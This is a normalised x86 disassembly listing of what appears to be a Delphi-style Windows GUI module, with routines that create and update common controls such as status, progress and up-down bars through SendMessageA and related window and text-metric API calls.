call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
sub_435460
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x18 ]
call sub_435c30
pop esi
pop ebx
retn
mov eax esi
call sub_418f90
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x18 ]
call sub_435aa8
pop esi
pop ebx
retn
sub_435490
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c448
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xff00000f
mov eax ebx
call sub_449fc0
mov edx 0x13
mov eax ebx
call sub_449600
mov dl 0x2
mov eax ebx
call sub_449334
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424944
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_4489fc
mov [ ebx + 0x215 ] 0x1
xor edx edx
mov eax ebx
call sub_449f4c
mov [ ebx + 0x217 ] 0x1
mov eax ebx
call sub_435a78
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_435548
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x20c ]
call sub_403154
mov eax [ esi + 0x208 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c56c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_435584
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_435188
mov edx esi
mov eax ebx
call sub_44d5a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d4d4
cmp [ ebx + 0x215 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x216 ] 0x0
jne r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov al 0x1
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ esi + 0x24 ]
or eax 0x2
or eax 0x1
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
sub_435607
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ebx + 0xa3ce8c3 ] cl
add [ eax ] al
mov eax ebx
call sub_44d6d4
mov eax [ ebx + 0x70 ]
call sub_423b68
push eax
push 0x0
push 0x2001
mov eax ebx
call sub_45071c
push eax
call SendMessageA
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_435c30
cmp [ ebx + 0x210 ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x0
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_404410
push eax
push 0xff
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x1
push 0x409
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_435690
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
mov al 0x1
pop ebx
retn
sub_4356b4
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x20c ]
call sub_424b98
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop ebx
retn
sub_4356f4
push ebx
mov ebx eax
cmp dl [ ebx + 0x214 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x214 ] dl
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x214 ]
push eax
push 0x409
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_435730
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
lea eax [ ebp - 0x1 ]
call sub_446c00
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_4044f8
dec al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_4044f8
jmp r-xdata
sub_435798
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403350
push eax
lea edx [ ebx + 0x210 ]
xor ecx ecx
mov eax ebx
call sub_435730
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x210 ]
call sub_404410
push eax
mov eax ebx
call sub_44a464
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0xff
push eax
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_4357fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
mov edx esi
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x210 ]
mov edx esi
call sub_403fa4
mov eax ebx
call sub_435798
sub_435828
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fa98
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov eax ebx
call sub_435798
mov eax [ ebx + 0x208 ]
call sub_4192f0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_435c30
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_435448
call sub_4352e8
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_435448
cmp [ eax + 0x17 ] 0x0
je r-xdata
sub_4358a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_449824
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_435448
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4353dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4359fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_435448
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435a01
mov eax [ ebp - 0x10 ]
call sub_403154
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_43543c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_435448
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_435448
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_435448
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_435a01
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192f0
dec eax
jle r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_435c30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4192f0
mov edx eax
dec edx
mov eax ebx
call sub_435448
mov edx [ ebp - 0x8 ]
call sub_4353cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_435448
mov edx [ ebp - 0xc ]
call sub_4353cc
sub_435a78
push ebx
mov ebx eax
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_449f14
mov edx 0xff000012
mov eax [ ebx + 0x68 ]
call sub_424028
sub_435aa8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_435c08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_450a20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435c0f
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov edx ebx
mov eax [ esi + 0x208 ]
call sub_435448
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebx + 0x19 ] 0x0
je r-xdata
mov [ ebx + 0x19 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_418f90
push eax
push 0x40a
mov eax esi
call sub_45071c
push eax
call SendMessageA
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_45071c
push eax
call InvalidateRect
jmp r-xdata
mov [ ebx + 0x19 ] 0x0
xor edi edi
mov al [ ebx + 0x15 ]
sub al 0x1
jb r-xdata
mov edi 0x100
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_435320
test al al
je r-xdata
mov edi 0x200
jmp r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
or edi 0x400
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0xc ]
call sub_403fe8
mov eax ebx
call sub_435338
test al al
je r-xdata
or edi 0x1000
mov al [ ebx + 0x14 ]
dec al
je r-xdata
mov eax ebx
call sub_435338
push eax
lea edx [ ebp - 0x8 ]
mov cl [ ebx + 0x14 ]
mov eax esi
call sub_435730
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_4044f8
dec al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
mov eax ebx
call sub_418f90
or edi eax
push edi
push 0x401
mov eax esi
call sub_45071c
push eax
call SendMessageA
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax r-xdata
call sub_4044f8
jmp r-xdata
sub_435c30
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf4
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_450a20
test al al
je r-xdata
add esp 0x20c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x208 ]
call sub_4192f0
mov [ esp + 0x4 ] eax
test bl bl
je r-xdata
mov ebp [ esp + 0x4 ]
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp + 0x4 ] 0x80
jle r-xdata
inc ebp
xor edi edi
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] 0x80
mov cl [ esp ]
mov edx edi
mov eax esi
call sub_435aa8
inc edi
dec ebp
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ esp + 0x4 ]
sub ebp 0x2
test ebp ebp
jl r-xdata
mov [ esp + 0xc ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
push 0x1
push 0x404
mov eax esi
call sub_45071c
push eax
call SendMessageA
push sub_435d44
push 0x0
push 0x401
mov eax esi
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp + eax * 4 + 0x8 ] 0xffffffff
lea eax [ esp + 0xc ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x404
mov eax esi
call sub_45071c
push eax
call SendMessageA
inc ebp
xor edi edi
lea ebx [ esp + 0xc ]
mov edx edi
mov eax [ esi + 0x208 ]
call sub_435448
mov eax [ eax + 0x10 ]
add [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
inc edi
add ebx 0x4
dec ebp
jne r-xdata
sub_435d44
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44fdbc
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_435a78
cmp eax 0x2a
jne r-xdata
pop esi
pop ebx
retn
sub_435d70
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424c0c
xor eax eax
push ebp
push sub_435e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_425038
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424ed8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4247f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424910
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_435448
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e6d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_425038
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_424eb0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_435e94
push ebx
push esi
mov esi edx
mov ebx eax
mov cl 0x1
xor edx edx
mov eax ebx
call sub_435c30
mov edx esi
mov eax ebx
call sub_44e8ac
pop esi
pop ebx
retn
sub_435eb4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403350
sub_435ef4
push ebx
mov ebx eax
cmp dl [ ebx + 0x217 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x217 ] dl
test dl dl
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov eax ebx
call sub_435a78
xor edx edx
mov eax ebx
call sub_449f4c
sub_435f5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4216ec
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
jne r-xdata
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov edx [ esi + 0x7c ]
mov eax ebx
call sub_4357fc
jmp r-xdata
mov eax [ ebx + 0x208 ]
call sub_4192f0
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_435448
mov edx [ esi + 0x7c ]
call sub_4353a4
sub_436021
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450108
mov dl 0x1
mov eax ebx
call sub_436050
pop ebx
pop ebp
retn 0x8
sub_436050
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] dl
mov edi eax
xor ebx ebx
mov eax edi
call sub_460ae8
mov esi eax
test esi esi
je r-xdata
cmp bl [ edi + 0x216 ]
je r-xdata
mov al [ esi + 0x229 ]
sub al 0x2
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x216 ] bl
cmp [ esp ] 0x0
je r-xdata
lea eax [ esp + 0x1 ]
push eax
lea ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
mov eax [ edi + 0x48 ]
call sub_405fd0
lea edx [ esp + 0x10 ]
mov ecx esi
mov eax edi
call sub_44c300
mov eax esi
call sub_449824
cmp eax [ esp + 0x1 ]
jne r-xdata
sub al 0x3
jne r-xdata
mov eax edi
call sub_44dcbc
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_449868
cmp eax [ esp + 0x5 ]
je r-xdata
mov bl 0x1
sub_4360dc
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov [ esp ] eax
cmp [ ebx + 0x232 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_436130
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44eb70
call sub_43dfe8
mov ecx esp
mov dl 0x1
call sub_43e26c
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
push 0x0
call sub_43dfe8
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
call sub_43e184
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_436190
add esp 0xfffffff0
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x8 ] 0xffff
mov [ esp + 0xc ] 0x0
push esp
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
add esp 0x10
retn
sub_4361c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x20
call sub_435188
mov [ edi + 0x208 ] al
mov ecx esi
xor edx edx
mov eax edi
call sub_44c448
mov edx 0x96
mov eax edi
call sub_4495dc
push 0x14
call GetSystemMetrics
mov edx eax
mov eax edi
call sub_449600
xor eax eax
mov [ edi + 0x20c ] eax
mov [ edi + 0x210 ] 0x64
mov [ edi + 0x218 ] 0xa
mov [ edi + 0x21c ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_436254
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d5a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d4d4
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
call InitCommonControls
cmp [ ebx + 0x21d ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x1
sub_4362ae
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44d6d4
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x20c ]
call sub_406ab8
push eax
push 0x0
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov eax [ ebx + 0x210 ]
push eax
mov eax [ ebx + 0x20c ]
push eax
push 0x406
mov eax ebx
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov edx [ ebx + 0x214 ]
mov eax ebx
call sub_436574
pop ebx
retn
sub_436354
push ebx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x20c ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x407
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_43638c
push ebx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x407
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_4363c4
push ebx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x214 ]
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x403
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x408
mov eax ebx
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
pop ebx
retn
sub_436414
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10c ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436547
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
cmp esi [ ebx + 0x20c ]
jne r-xdata
test esi esi
jl r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
cmp edi [ ebx + 0x210 ]
je r-xdata
call sub_436190
cmp esi 0xffff
jg r-xdata
mov [ ebx + 0x20c ] esi
mov [ ebx + 0x210 ] edi
cmp [ ebx + 0x208 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43654e
lea eax [ ebp - 0x10c ]
call sub_403f50
retn
test edi edi
jl r-xdata
mov edx edi
mov eax esi
call sub_406ab8
push eax
push 0x0
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
push edi
push esi
push 0x406
mov eax ebx
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
cmp edi 0xffff
jle r-xdata
push 0x0
push esi
push 0x402
mov eax ebx
call sub_45071c
push eax
call SendMessageA
cmp esi [ ebx + 0x20c ]
jge r-xdata
sub_436574
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
test esi esi
jl r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
push 0x0
push esi
push 0x402
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop esi
pop ebx
retn
call sub_436190
cmp esi 0xffff
jle r-xdata
sub_4365c0
push ebx
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_450a20
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_43664c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c448
mov edx 0x79
mov eax esi
call sub_4495dc
mov edx 0x19
mov eax esi
call sub_449600
mov dl 0x1
mov eax esi
call sub_450950
xor edx edx
mov eax esi
call sub_449fe4
mov [ esi + 0x208 ] 0x1
mov al [ r-xdata ]
mov [ esi + 0x20a ] al
mov al [ r-xdata ]
mov [ esi + 0x209 ] al
mov [ esi + 0x20c ] 0x41
mov eax esi
call sub_436904
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4366d9
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x40
call sub_435188
mov edx esi
mov eax ebx
call sub_44d5a8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d4d4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
sub_436720
push ebx
mov ebx eax
mov eax ebx
call sub_44d6d4
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406ab8
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_45071c
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406aa4
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_436794
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x209 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x209 ] al
xor eax eax
mov al [ esp ]
xor edx edx
call sub_406ab8
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_45071c
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406aa4
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_436804
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x20a ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x20a ] al
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406ab8
push eax
xor eax eax
mov al [ esp + 0x4 ]
push eax
push 0x403
mov eax ebx
call sub_45071c
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406aa4
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_436874
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x402
mov eax ebx
call sub_45071c
push eax
call SendMessageA
mov edx eax
mov eax ebx
call sub_4369fc
pop ebx
retn
sub_436898
push ebx
mov ebx eax
mov eax ebx
call sub_4369ac
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406aa4
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_45071c
push eax
call SendMessageA
pop ebx
retn
sub_4368d0
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_436904
pop ebx
retn
sub_436904
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_42403c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_449600
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
